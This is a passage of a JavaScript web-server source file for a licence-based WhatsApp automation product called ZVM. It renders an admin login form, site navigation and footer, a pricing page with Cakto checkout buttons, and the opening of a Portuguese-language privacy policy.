    <p class="auth-promo-sub">Chaves, auditoria, usuários e proteção do serviço em uma área reservada ao administrador.</p>
    <div class="admin-auth-meta"><div><strong>Auditoria</strong><span>Histórico e alertas de segurança.</span></div><div><strong>Licenças</strong><span>Gestão de chaves e dispositivos.</span></div></div>
  </div></section>
  <section class="auth-form-wrap"><div class="auth-form-card">
    <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
    <h2>Entrar no painel</h2><p class="auth-form-hint">Acesso administrativo ZVM.</p><div class="auth-secure-chip">Sessão administrativa protegida</div>
    ${error ? `<div class="auth-alert err" role="alert">${escHtml(error)}</div>` : ''}
    <form method="POST" action="${R_ADMIN}">
      <div class="auth-field"><label for="admin-user">Usuário</label><input id="admin-user" type="text" name="user" autocomplete="username" required></div>
      <div class="auth-field"><label for="admin-pass">Senha</label><input id="admin-pass" type="password" name="pass" autocomplete="current-password" required></div>
      ${TOTP_SECRET ? `<div class="auth-field"><label for="admin-totp">Código 2FA</label><input id="admin-totp" type="text" name="totp" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" autocomplete="one-time-code" class="zvm-privileged-totp-admin"></div>` : ''}
      <button type="submit" class="auth-submit">Entrar</button>
    </form>
    <div class="auth-footnote">Acesso reservado à administração.</div>
  </div></section>
</main>${_SCRIPT_PWD_TOGGLE}</body></html>`;
}


// ──────────── SHARED PAGE HELPERS ───────────────────────────────
const _FAV = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%2308080f'/%3E%3Ctext x='50%25' y='54%25' dominant-baseline='middle' text-anchor='middle' font-family='monospace' font-weight='700' font-size='14' fill='%2300ff87'%3EZVM%3C/text%3E%3C/svg%3E";
const _CSS_SHARED = '<link rel="stylesheet" href="/assets/zvm-shared.6dac16eb7b5b.css">';
const _CSS_SYSTEM = '<link rel="stylesheet" href="/assets/zvm-r46-system.aa366d924866.css">';
const _CSS_STANDALONE = '<link rel="stylesheet" href="/assets/zvm-standalone.d6d2222fe00a.css">';
const _CSS_AUTH = '<link rel="stylesheet" href="/assets/zvm-r46-auth.286cb26442a2.css"><link rel="stylesheet" href="/assets/zvm-auth-premium.a96f915db3f4.css">';
const _CSS_PRIVILEGED_AUTH = '<link rel="stylesheet" href="/assets/zvm-privileged-auth.daab7ea4861a.css">';
const _CSS_CLIENT_WORKSPACE = '<link rel="stylesheet" href="/assets/zvm-r46-client-workspace.6dbf0f685e67.css">';
const _CSS_LANDING = '<link rel="stylesheet" href="/assets/zvm-r46-landing.af4c6e5c623b.css">';
const _CSS_PUBLIC_PREMIUM = '<link rel="stylesheet" href="/assets/zvm-public-premium.ab131a22bcdd.css">';
const _CSS_PUBLIC_EXPERIENCE = '<link rel="stylesheet" href="/assets/zvm-public-experience.b95326ae9de7.css">';
const _CSS_REFERENCE_PUBLIC = '<link rel="stylesheet" href="/assets/zvm-reference-public.19040fd11331.css">';
const _CSS_SALES_STATE = '<link rel="stylesheet" href="/assets/zvm-sales-state.1422fd551ff5.css">';
const _CSS_LEGAL_PREMIUM = '<link rel="stylesheet" href="/assets/zvm-legal-premium.a828eee21356.css">';
const _CSS_ANALYTICS_PREMIUM = '<link rel="stylesheet" href="/assets/zvm-analytics-premium.e8ce624836b1.css">';
const _CSS_FAQ = '<link rel="stylesheet" href="/assets/zvm-faq.b388ca55cbf4.css">';
const _CSS_PRIVACY = '<link rel="stylesheet" href="/assets/zvm-privacy.7be30b7da0a1.css">';
const _CSS_TERMS = '<link rel="stylesheet" href="/assets/zvm-terms.f1c470efdbbb.css">';
const _CSS_PLANS = '<link rel="stylesheet" href="/assets/zvm-plans-page.9dcee339fb9b.css">';
const _CSS_ERROR_404 = '<link rel="stylesheet" href="/assets/zvm-error-404.bea758f1e983.css">';
const _CSS_ERROR_500 = '<link rel="stylesheet" href="/assets/zvm-error-500.c2528a1f4a3c.css">';
const _SCRIPT_PWD_TOGGLE = '<script src="/assets/zvm-password-toggle.f779f56bc8f1.js" defer></script>';
const _SCRIPT_AUTH_SUBMIT_LOCK = '<script src="/assets/zvm-auth-submit-lock.c4dfbde1ba00.js" defer></script>';
const _GFONTS = '';



// ── Brand oficial ZVM — incorporada no próprio servidor ────────────────
// O portal não depende de /static nem de arquivos soltos no deploy.
const ZVM_BRAND_ICON_ASSET = '/assets/zvm-brand.167357885820.png';
const ZVM_FOUNDER_AVATAR_ASSET = '/assets/lr1290-avatar.313ed8884277.png';
const ZVM_CHROME_STORE_URL = 'https://chromewebstore.google.com/detail/zvm-automações/bdhnikgcdccjabkmbfcakgjkkgdlmgja';
function renderZvmActionHub(surface='client') {
  const title = surface==='admin' ? 'Ações do painel' : 'Mais ações';
  const content = surface==='admin'
    ? '<button type="button" onclick="exportCSV()">Exportar CSV</button><a href="'+R_ADMIN+'/logout">Sair do Admin</a>'
    : '<a href="'+R_ANALYTICS+'/export/csv">Exportar CSV</a><button type="button" onclick="purgeOpen()">Limpar dados</button><a href="'+R_ANALYTICS+'/logout">Sair do Analytics</a>';
  return `<details class="zvm-action-hub"><summary>${title}<span aria-hidden="true">⌄</span></summary><div class="zvm-action-hub-menu">${content}</div></details>`;
}
function renderCanonicalOwnerBrand() {
  // Same visual source as the sales-page header; no cloned assets or logo variants.
  return '<img class="owner-panel-brand-img" src="' + OWNER_TOP_BRAND_SRC +
    '" alt="ZVM Automações" loading="eager" decoding="async">';
}
function renderStandaloneBrand(variant = 'nav') {
  const safeVariant = ['nav','auth','dash','compact'].includes(variant) ? variant : 'nav';
  return `<span class="zvm-brand-logo zvm-brand-${safeVariant}" role="img" aria-label="ZVM"><img data-zvm-mark="1" src="${ZVM_BRAND_ICON_ASSET}" alt="" aria-hidden="true" loading="eager" decoding="async"><span class="zvm-brand-wordmark">ZVM</span></span>`;
}

function _sharedNav(options = '', legacyPortalUser = null) {
  // Assinatura de string preservada para páginas antigas do portal.
  if (typeof options === 'string') {
    const activePath = options;
    const portalUser = legacyPortalUser;
    const links = [
      ['/', '← Voltar'],
      ['/verificar', 'Verificar chave'],
      ['/faq', 'FAQ'],
      ['/privacidade', 'Privacidade'],
      ['/planos', 'Planos'],
      [ZVM_SUPPORT_URL, 'Suporte', 'target="_blank" rel="noopener"'],
    ];
    const linksHtml = links.map(([href, label, extra = '']) => {
      const active = href === activePath ? ' nav-active' : '';
      return `<a href="${href}"${extra ? ' ' + extra : ''} class="${active}">${label}</a>`;
    }).join('');
    const accountHtml = portalUser ? `
      <a href="/cliente" class="nav-account">
        <span class="nav-account-avatar">${escHtml((portalUser.name||'?')[0].toUpperCase())}</span>
        <span class="nav-account-name">${escHtml(portalUser.name||portalUser.email||'Minha Conta')}</span>
      </a>` : ``;
    return `<nav class="znav">
    <a href="/" class="znav-brand owner-panel-brand">${renderCanonicalOwnerBrand()}</a>
    <div class="znav-links">${linksHtml}${accountHtml}</div>
  </nav>`;
  }

  const { activePath = '', portalUser = null, showBack = false, variant = '' } = options || {};

  // Nav mínima pro fluxo de autenticação deslogado (login/registro/recuperar/
  // redefinir/2FA-verificar): só a marca, sem FAQ/Planos/Suporte/Entrar/
  // Cadastrar competindo com o formulário. Cada página já tem seus próprios
  // links funcionais (criar conta, entrar, esqueci minha senha, cancelar)
  // dentro do próprio card — nada foi removido, só não duplicado aqui em
  // cima. Área LOGADA (2FA setup, dashboard) continua usando a nav cheia.
  if (variant === 'auth') {
    // Sem nav nas páginas de autenticação: a marca principal já aparece
    // dentro do próprio card (auth-form-brand, variant 'auth', 130px). Um
    // <nav> vazio ainda ocuparia os 64px + border-bottom fixos de .znav
    // (_sharedCss) mesmo sem links dentro — por isso o elemento não é
    // renderizado (não é display:none nem visibility:hidden, ele
    // simplesmente não existe no DOM), e o auth-shell começa no topo.
    // Landmark <nav> vazio também é um anti-padrão de acessibilidade
    // (leitor de tela anuncia uma região sem conteúdo).
    return `<a class="skip-link" href="#main-content">Pular para o conteúdo</a>`;
  }

  const mainLinks = [
    ['/#recursos', 'Recursos'],
    ['/#como', 'Como funciona'],
    ['/planos', 'Planos'],
    ['/faq', 'FAQ'],
    ['/privacidade', 'Privacidade'],
    ['/termos', 'Termos de Serviço'],
  ];
  const mainLinksHtml = mainLinks.map(([href, label]) => {
    const route = href.split('#')[0] || '/';
    const active = route !== '/' && route === activePath ? ' nav-active' : '';
    const current = route !== '/' && route === activePath ? ' aria-current="page"' : '';
    return `<a href="${href}" class="${active}"${current}>${label}</a>`;
  }).join('');
  const accountHtml = portalUser ? `
    <a href="/cliente" class="nav-account">
      <span class="nav-account-avatar">${escHtml((portalUser.name||'?')[0].toUpperCase())}</span>
      <span class="nav-account-name">${escHtml(portalUser.name||portalUser.email||'Minha Conta')}</span>
    </a>` : `<a href="/cliente" class="nav-login">Entrar</a><a href="/cliente/registro" class="nav-cta">Cadastrar</a>`;
  const installAction = `<a href="${ZVM_CHROME_STORE_URL}" class="owner-nav-install" target="_blank" rel="noopener noreferrer">Instalar grátis</a>`;
  return `<a class="skip-link" href="#main-content">Pular para o conteúdo</a><nav class="znav standalone-nav" aria-label="Navegação principal">
  <a href="/" class="znav-brand owner-panel-brand"${activePath === '/' ? ' aria-current="page"' : ''}>${renderCanonicalOwnerBrand()}</a>
  <button class="nav-menu-toggle" type="button" aria-expanded="false" aria-controls="zvm-nav-links" aria-label="Abrir menu"><span></span><span></span><span></span></button>
  <div class="znav-links" id="zvm-nav-links"><div class="znav-main-links">${mainLinksHtml}</div><div class="znav-action-links">${installAction}${accountHtml}</div></div>
</nav><script src="/assets/zvm-nav.d7d7bba83d44.js" defer></script>`;
}


function _standaloneFoot() {
  return renderPublicFooter();
}

function _sharedFoot() {
  return `<footer class="zfooter">
  <div class="zfooter-links">
    <a href="${ZVM_CHROME_STORE_URL}" target="_blank" rel="noopener noreferrer">Instalar no Chrome</a>
    <a href="/faq">FAQ</a>
    <a href="/planos">Planos</a>
    <a href="/privacidade">Privacidade</a>
    <a href="/verificar">Verificar Chave</a>
    <a href="/cliente">Portal do Cliente</a>
    <a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener">Suporte</a>
  </div>
  <div class="zfooter-copy">© ${new Date().getFullYear()} ZVM · Todos os direitos reservados</div>
</footer>`;
}


const renderLandingPage = createLandingRenderer({
  escHtml,
  favicon: _FAV,
  sharedCssLink: _CSS_SHARED + _CSS_STANDALONE,
  landingCssLink: _CSS_LANDING + _CSS_SYSTEM + _CSS_PUBLIC_PREMIUM + _CSS_SALES_STATE + _CSS_PUBLIC_EXPERIENCE + _CSS_REFERENCE_PUBLIC,
  chromeStoreBadge: renderChromeStoreBadge,
  plans: ZVM_PUBLIC_PLANS,
  salesPaused: ZVM_SALES_PAUSED,
  publicNav: portalUser => _sharedNav({ activePath: '/', portalUser, showBack: false }),
});

// ──────────────── VERIFICAR CHAVE ──────────────
// Legacy public key-management UI removed in R44.10.
// Historical aliases now redirect to the authenticated /cliente portal.

// ──────────────── PLANOS ──────────────
function formatPlanPrice(price) {
  const [whole, cents] = Number(price).toFixed(2).split('.');
  return { whole, cents };
}

const PLAN_ICONS = {
  solo: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="3.4"/><path d="M5 20c0-3.9 3.1-7 7-7s7 3.1 7 7"/></svg>',
  padrao: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 4 14h6l-1 8 9-12h-6z"/></svg>',
  pro: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.5c3 2 5 6 5 9.7 0 1.7-.4 3-1 4l-4 4.3-4-4.3c-.6-1-1-2.3-1-4 0-3.7 2-7.7 5-9.7Z"/><circle cx="12" cy="10.5" r="1.6"/><path d="M8.5 16.5l-2.8 2.8M15.5 16.5l2.8 2.8"/></svg>',
  empresarial: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="3" width="10" height="18" rx="1"/><path d="M14 21h6V9l-6-3"/><path d="M7.5 7h1M7.5 11h1M7.5 15h1M11 7h1M11 11h1M11 15h1"/></svg>',
  start_v2: '<span aria-hidden="true">&#128994;</span>',
  pro_v2: '<span aria-hidden="true">&#9889;</span>',
  enterprise_v2: '<span aria-hidden="true">&#128995;</span>',
};
const PLAN_IDENTITY = {
  solo: { subtitle: 'Ideal para começar' },
  padrao: { subtitle: 'Melhor custo-benefício' },
  pro: { subtitle: 'Para equipes' },
  empresarial: { subtitle: 'Maior economia por número' },
  start_v2: { subtitle: 'Quem está começando' },
  pro_v2: { subtitle: 'Operação completa' },
  enterprise_v2: { subtitle: 'Implantação sob consulta' },
};
const NEED_OPTIONS = [
  { planId:'solo', label:'1' },
  { planId:'padrao', label:'Até 3' },
  { planId:'pro', label:'Até 5' },
  { planId:'enterprise_v2', label:'Até 10' },
];

// Shared journey for the public pricing page and authenticated renewals.
// Payment itself is always performed by Cakto; this section has no checkout links.
function renderPurchaseJourney() {
  const action = ZVM_SALES_PAUSED ? 'Aguarde a reabertura dos checkouts' : 'Pague com segurança no checkout Cakto';
  return `<section class="r4700-purchase-journey" aria-labelledby="r4700-purchase-title">
    <div class="r4700-purchase-heading"><span>Como funciona</span><h2 id="r4700-purchase-title">Três passos para organizar seu acesso.</h2></div>
    <ol class="r4700-purchase-steps">
      <li><span class="r4700-purchase-index">01</span><div><strong>Escolha sua licença</strong><p>Compare quantidade de números e período de acesso.</p></div></li>
      <li><span class="r4700-purchase-index">02</span><div><strong>${action}</strong><p>O pagamento acontece fora do site ZVM, pela Cakto. Sem login obrigatório na ZVM.</p></div></li>
      <li><span class="r4700-purchase-index">03</span><div><strong>Receba e vincule a chave</strong><p>Use um e-mail válido na compra. Depois, <a href="/cliente/vincular">vincule a licença</a> à sua conta ZVM.</p></div></li>
    </ol>
  </section>`;
}

function renderPlanosPage(portalUser = null) {
  const isLoggedIn = !!portalUser;
  const cards = Object.values(ZVM_PUBLIC_PLANS).map(plan => {
    const price = formatPlanPrice(plan.price);
    const perDevice = plan.consult ? '' : (plan.price / plan.maxUses).toFixed(2).replace('.', ',');
    const popular = plan.id === 'pro';
    const identity = PLAN_IDENTITY[plan.id] || { subtitle: '' };
    const icon = PLAN_ICONS[plan.id] || '';
    // Checkout de visitante: Cakto coleta e-mail e envia a chave sem exigir sessão ZVM.
    // Quando logado, o claim assinado continua permitindo renovação da chave correta.
    const action = plan.consult
      ? '<a class="plan-btn plan-btn-outline r4701-contact-plan" href="'+escHtml(ZVM_SUPPORT_URL)+'" target="_blank" rel="noopener noreferrer">Consultar a equipe ↗</a>'
      : ZVM_SALES_PAUSED
        ? '<button class="plan-btn plan-btn-outline" type="button" disabled aria-disabled="true">Vendas temporariamente pausadas</button>'
        : !plan.enabled
          ? '<button class="plan-btn plan-btn-outline" type="button" disabled title="Checkout Cakto ainda não vinculado a esta oferta">Compra indisponível no momento</button>'
          : '<button type="button" class="plan-btn '+(popular?'plan-btn-primary':'plan-btn-outline')+'" data-buy-plan="'+plan.id+'" data-checkout="'+escHtml(isLoggedIn ? checkoutUrlForPortal(plan.checkoutUrl,portalUser?.keyCode,portalUser?.email,APP_SECRET) : plan.checkoutUrl)+'" data-plan-name="'+escHtml(plan.shortName)+'" data-devices="'+plan.maxUses+'" data-duration="'+plan.durationDays+'" data-price="'+price.whole+','+price.cents+'">Comprar '+escHtml(plan.shortName)+'</button>';
    return `<article class="price-card${popular?' featured':''}" aria-labelledby="plan-${plan.id}" data-plan-id="${plan.id}">
      <div class="client-plan-tags">${popular?'<span class="price-badge">Mais popular</span>':''}${plan.consult?'<span class="price-badge">Sob consulta</span>':''}</div>
      <span class="price-icon" aria-hidden="true">${icon}</span>
      <h2 class="price-tier" id="plan-${plan.id}">${escHtml(plan.shortName)}</h2>
      ${identity.subtitle ? `<p class="price-subtitle">${escHtml(identity.subtitle)}</p>` : ''}
      <p class="price-devices">${plan.maxUses} ${plan.maxUses===1?'número':'números'} de WhatsApp</p>
      <div class="price-val">${plan.consult?'Sob consulta':`<sup>R$</sup>${price.whole}<span>,${price.cents}</span><sub>/mês</sub>`}</div>
      <p class="price-per${plan.maxUses>1?' price-per-strong':''}">${plan.consult?'Implantação personalizada':'R$ '+perDevice+' por número'}</p>
      <div class="price-divider"></div>
      <ul class="price-feats">
        <li><span class="chk">✓</span>Todos os recursos inclusos</li>
        <li><span class="chk">✓</span>${plan.durationDays} dias de acesso</li>
        <li><span class="chk">✓</span>Entrega automática por e-mail</li>
        <li><span class="chk">✓</span>Renovação e troca pelo portal</li>
      </ul>${action}
    </article>`;
  }).join('');

  const needPicker = `<div class="need-picker" role="radiogroup" aria-labelledby="need-picker-label">
    <p class="need-picker-label" id="need-picker-label">Quantos números você precisa conectar?</p>
    <div class="need-options">${NEED_OPTIONS.map(opt => `<label class="need-opt"><input type="radio" name="need" value="${opt.planId}"><span>${opt.label}</span></label>`).join('')}</div>
  </div>`;

  const buyerBox = isLoggedIn && !ZVM_SALES_PAUSED ? `<div class="buyer-box"><div class="buyer-box-label">Conta conectada:</div><div class="buyer-box-email">${escHtml(portalUser.email || '')}</div><p class="buyer-box-hint">No pagamento, informe este mesmo e-mail para facilitar a associação da licença.</p></div>` : '';
  const purchaseNote = ZVM_SALES_PAUSED
    ? '<div class="purchase-note sales-paused-alert" role="status"><strong>Vendas temporariamente suspensas.</strong> Estamos realizando ajustes. Nenhum novo checkout está disponível pelo site neste momento. Compras já pagas seguem em processamento e suporte permanece disponível.</div>'
    : '<div class="purchase-note purchase-link-notice" role="note"><strong>Não precisa criar conta para comprar.</strong> Informe um e-mail válido no pagamento: a chave será enviada para ele. Depois, <a href="/cliente/registro">crie uma conta</a> ou <a href="/cliente">entre na sua conta</a> e <a href="/cliente/vincular">vincule a chave</a> no Portal do Cliente. Use o mesmo e-mail da compra para facilitar a vinculação automática.</div>';

  const modalContent = ZVM_SALES_PAUSED ? '' : `
    <div class="modal-icon" aria-hidden="true">↗</div><h2 id="checkout-title">Confirmar plano</h2>
    <div class="modal-plan-summary"><div class="modal-plan-name" id="modal-plan-name">—</div><div class="modal-plan-meta" id="modal-plan-meta">—</div><div class="modal-plan-price" id="modal-plan-price">—</div></div>
    ${isLoggedIn ? `<div class="modal-account"><span class="modal-account-label">Conta ZVM</span><strong class="modal-email">${escHtml(portalUser.email || '')}</strong></div>` : ''}
    <p class="modal-hint"><strong>Compra sem login obrigatório.</strong> Informe seu e-mail correto na Cakto para receber a chave. Depois da compra, acesse <a href="/cliente/vincular">Portal do Cliente → Vincular chave</a>. Se já tiver uma conta, use o mesmo e-mail do pagamento.</p>
    <div class="modal-actions"><button type="button" class="modal-cancel">Voltar</button><a class="modal-continue" href="#" target="_blank" rel="noopener noreferrer">Continuar para pagamento →</a></div>`;

  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="description" content="Planos ZVM SOLO (R$39,90, 1 número), START (R$59,90, 3 números), PRO (R$94,90, 5 números) e ENTERPRISE sob consulta.">
<title>ZVM — Planos e Preços</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_PLANS}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_SALES_STATE}${_CSS_PUBLIC_EXPERIENCE}${_CSS_REFERENCE_PUBLIC}</head><body class="zvm-public-premium zvm-plans-premium zvm-experience">${_sharedNav({activePath:'/planos',portalUser,showBack:true})}
<main id="main-content" class="r4700-plans-main r4701-plans-main">
<header class="page-hero r4700-plans-hero r4701-plans-hero"><div class="r4701-plans-hero-inner">
  <div class="r4701-plans-hero-copy"><div class="page-hero-tag">Planos e Licenças</div><h1>Planos e <span>Licenças.</span></h1><p>Um único produto, todos os recursos da ZVM. Escolha sua licença conforme o número de WhatsApps que precisa conectar e gerencie tudo no Portal do Cliente.</p>
    <div class="r4701-plans-hero-actions"><a class="r4701-button primary" href="#selecionar-plano">Ver planos abaixo ↓</a><a class="r4701-button secondary" href="/?sec=produto">Ver a ZVM na prática ↗</a></div>
    <div class="r4701-plans-hero-highlights"><span>✓ Mesmo produto</span><span>✓ Recursos inclusos</span><span>✓ Licença gerenciável</span></div>
  </div>
  <div class="r4701-license-demo" role="img" aria-label="Representação ilustrativa do gerenciamento de licenças ZVM, sem dados de clientes.">
    <div class="r4701-license-demo-bar"><span><i aria-hidden="true"></i>ZVM</span><small>Painel de licenças • ilustração</small><span aria-hidden="true">◦◦◦</span></div>
    <div class="r4701-license-demo-shell"><div class="r4701-license-demo-side" aria-hidden="true"><strong>◈ Início</strong><span>◎ CRM</span><span>◇ Fluxos</span><span>▤ Biblioteca</span><span>↗ Disparos</span><span class="active">▣ Planos e Licenças</span></div>
    <div class="r4701-license-demo-content"><div class="r4701-license-demo-heading"><strong>Planos e Licenças</strong><small>Consulte seus acessos</small></div><div class="r4701-license-demo-grid"><div><small>Licença</small><strong>ZVM PRO</strong><span>Até ${ZVM_PUBLIC_PLANS.pro.maxUses} números</span></div><div><small>Seu portal</small><strong>Gerencie</strong><span>Chaves e acessos</span></div><div><small>Vinculação</small><strong>Por chave</strong><span>Após a compra</span></div><div><small>Ativação</small><strong>Na sua conta</strong><span>Controle de acesso</span></div></div></div></div>
    <div class="r4701-license-caption">Prévia ilustrativa · informações demonstrativas</div>
  </div>
</div></header>
<div class="plans-wrap">
${purchaseNote}
<div class="r4700-plans-selection" id="selecionar-plano"><div class="r4700-selection-header"><span>Escolha seu plano</span><h2>Planos para cada necessidade.</h2><p>Mais números, mais flexibilidade. Os preços e limites abaixo são os valores reais cadastrados na ZVM.</p></div>${needPicker}${buyerBox}<section class="pricing-grid" aria-label="Planos ZVM">${cards}</section></div>
<section class="r4701-plans-included" aria-labelledby="r4701-included-title">
  <div class="r4701-plans-included-copy"><span class="r4700-eyebrow">Comparativo</span><h2 id="r4701-included-title">O que está incluído em todos os planos.</h2><p>O conjunto de módulos é o mesmo. O limite de números e o preço variam conforme a licença escolhida.</p></div>
  <div class="r4701-plans-included-grid"><article><span>◇</span><div><strong>Fluxos e Funis</strong><small>Organização das automações</small></div></article><article><span>▤</span><div><strong>Biblioteca</strong><small>Conteúdo reutilizável</small></div></article><article><span>♧</span><div><strong>CRM</strong><small>Contatos e etapas</small></div></article><article><span>➤</span><div><strong>Disparos</strong><small>Preparação e controle</small></div></article><article><span>▥</span><div><strong>Organização</strong><small>Gestão da rotina</small></div></article><article><span>↻</span><div><strong>Licenciamento</strong><small>Chaves e acessos</small></div></article></div>
</section>
${renderPurchaseJourney()}
<div class="r4701-license-advice"><span aria-hidden="true">⚿</span><div><strong>A chave é vinculada depois da compra</strong><p>Quando os pagamentos estiverem disponíveis, informe seu e-mail na Cakto. Depois de receber a licença, acesse o <a href="/cliente/vincular">Portal do Cliente</a> para vincular a chave à sua conta ZVM. Não é necessário fazer login antes de comprar.</p></div></div>
<section class="r4701-plans-faq" aria-labelledby="r4701-plans-faq-title"><div><span class="r4700-eyebrow">FAQ</span><h2 id="r4701-plans-faq-title">Dúvidas sobre planos e licenças.</h2><p>Respostas rápidas sobre o funcionamento da licença, pagamento e gerenciamento.</p><a href="/faq" class="r4701-button secondary">Ver FAQ completa ↗</a></div><div class="r4701-plans-faq-list">
${[_faqPick('Preciso criar uma conta'),_faqPick('Como recebo minha licença'),_faqPick('Como renovo'),_faqPick('Como vincular uma chave'),_faqPick('Posso alterar')].map(([q,a])=>`<details><summary>${escHtml(q)}</summary><p>${escHtml(a)}</p></details>`).join('')}
</div></section>
<section class="r4700-plans-assurance" aria-label="O que está incluído"><div><span aria-hidden="true">✓</span><strong>Recursos completos</strong><p>CRM, Fluxos, Funis, Biblioteca e demais módulos disponíveis na extensão.</p></div><div><span aria-hidden="true">✓</span><strong>Clareza na licença</strong><p>Prazo, número de acessos e gerenciamento ficam visíveis no Portal do Cliente.</p></div><div><span aria-hidden="true">✓</span><strong>Suporte para começar</strong><p>Orientações de instalação e vinculação pelo canal oficial da ZVM.</p></div></section>
<div class="r4701-plans-final"><div><h2>Pronto para organizar seu atendimento?</h2><p>${ZVM_SALES_PAUSED ? 'As vendas estão temporariamente suspensas. Você pode conhecer os recursos e preparar sua conta enquanto isso.' : 'Escolha uma licença, receba sua chave e vincule-a à sua conta para começar.'}</p></div><div>${ZVM_SALES_PAUSED ? '<span class="r4701-pause-pill" role="status">Vendas em pausa</span>' : '<a class="r4701-button primary" href="#selecionar-plano">Comparar planos ↑</a>'}</div></div>
<p class="plans-footnote">Tem dúvidas sobre sua escolha? <a href="/faq">Consulte as perguntas frequentes</a> ou <a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer">fale com o suporte</a>.</p></div></main>
${ZVM_SALES_PAUSED ? '' : `<dialog class="checkout-dialog" aria-labelledby="checkout-title"><div class="dialog-inner">${modalContent}</div></dialog>`}${_standaloneFoot()}
<script src="/assets/zvm-plans.3d82262649b9.js" defer></script></body></html>`;
}

// ──────────────── PRIVACIDADE ──────────────
function renderPrivacyPage(portalUser = null) {
  const topics = [
    ['dados','Dados tratados pela ZVM'],
    ['uso','Como usamos os dados'],
    ['terceiros','Integrações opcionais e terceiros'],
    ['retencao','Armazenamento e retenção'],
    ['seguranca','Segurança'],
    ['direitos','Seus direitos (LGPD)'],
    ['cookies','Cookies e rastreamento'],
    ['google','Chrome Web Store e Uso Limitado'],
    ['contato','Contato'],
  ];
  const toc = topics.map(([id,label],i)=>'<li><a href="#privacidade-'+id+'"><span aria-hidden="true">'+String(i+1).padStart(2,'0')+'</span>'+escHtml(label)+'</a></li>').join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Política de Privacidade</title>
<meta name="description" content="Política de Privacidade da ZVM - Automações: conta, licença, segurança, armazenamento local, integrações opcionais e direitos do usuário.">
<link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_PRIVACY}${_CSS_SYSTEM}${_CSS_PUBLIC_PREMIUM}${_CSS_LEGAL_PREMIUM}</head>
<body class="zvm-public-premium zvm-legal-premium zvm-privacy-premium">
${_sharedNav({activePath:'/privacidade',portalUser,showBack:true})}
<main id="main-content" class="zvm-privacy-main"><div class="page-hero">
  <div class="page-hero-tag">Legal</div>
  <h1>Política de <span class="privacy-accent">Privacidade</span></h1>
  <p>Conheça o tratamento de dados, as medidas de segurança e os seus direitos.</p>
</div>
<div class="zvm-trust-layout">
  <aside class="zvm-trust-aside" aria-label="Navegação da política de privacidade">
    <nav class="zvm-trust-toc" aria-label="Seções da política de privacidade"><h2>Nesta página</h2><ol>${toc}</ol></nav>
    <div class="zvm-trust-help"><strong>Precisa de ajuda com seus dados?</strong><p>Entre em contato com o suporte sobre privacidade e licenças.</p><a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener noreferrer">Contato e suporte <span aria-hidden="true">↗</span></a></div>
  </aside>
  <div class="doc-wrap zvm-trust-content">
  <div class="info-box"><strong>Resumo:</strong> A ZVM não usa telemetria comportamental, publicidade ou rastreamento de navegação. Tratamos apenas os dados necessários para conta, licença, segurança e recursos que o próprio usuário ativa. Não vendemos dados pessoais.</div>
  <section class="doc-section" id="privacidade-dados" aria-labelledby="heading-privacidade-dados">
    <h2 id="heading-privacidade-dados"><span class="sec-num">1</span>Dados tratados pela ZVM</h2>
    <p>Tratamos somente as informações necessárias para prestar e proteger o serviço:</p>
    <ul>
      <li>Nome, e-mail e telefone quando o usuário cria uma conta no Portal do Cliente</li>
      <li>Chave de licença, plano e números/dispositivos vinculados à licença</li>
      <li>Dados técnicos mínimos de segurança e autenticação, como endereço IP, data/hora, sessão e eventos de acesso</li>
      <li>Erros técnicos necessários para diagnóstico, sem registrar o conteúdo de mensagens do WhatsApp</li>
    </ul>
    <p>CRM, fluxos, biblioteca, notas, preferências e outros conteúdos criados pelo usuário permanecem localmente no navegador por padrão. A ZVM não coleta histórico de navegação nem mantém analytics comportamental sobre cliques, rolagem ou uso da interface.</p>
  </section>
  <section class="doc-section" id="privacidade-uso" aria-labelledby="heading-privacidade-uso">
    <h2 id="heading-privacidade-uso"><span class="sec-num">2</span>Como usamos os dados</h2>
    <ul>
      <li>Autenticar a conta, validar a licença e manter a sessão</li>
      <li>Aplicar limites comerciais e permitir o gerenciamento de números/dispositivos autorizados</li>
      <li>Detectar abuso, fraude, acesso indevido e falhas operacionais</li>
      <li>Executar recursos solicitados pelo usuário, como integrações, IA, webhooks, consultas de endereço e backups</li>
      <li>Prestar suporte quando solicitado pelo próprio usuário</li>
    </ul>
    <p>Não usamos dados para publicidade, criação de perfil comercial do usuário, venda a terceiros, concessão de crédito ou finalidades alheias ao funcionamento da ZVM.</p>
  </section>
  <section class="doc-section" id="privacidade-terceiros" aria-labelledby="heading-privacidade-terceiros">
    <h2 id="heading-privacidade-terceiros"><span class="sec-num">3</span>Integrações opcionais e terceiros</h2>
    <p>A ZVM só transmite conteúdo a serviços externos quando o usuário ativa explicitamente o recurso correspondente.</p>
    <ul>
      <li>OpenAI, Google Gemini ou xAI: somente quando o usuário configura a própria credencial e solicita um recurso de IA; apenas o conteúdo necessário à solicitação é enviado ao provedor escolhido</li>
      <li>Integrações oficiais adicionais: só entram em operação quando o recurso correspondente estiver disponível no produto e for explicitamente configurado ou ativado pelo usuário</li>
      <li>ViaCEP e IBGE: somente quando o usuário utiliza consulta de CEP/UF e cidades</li>
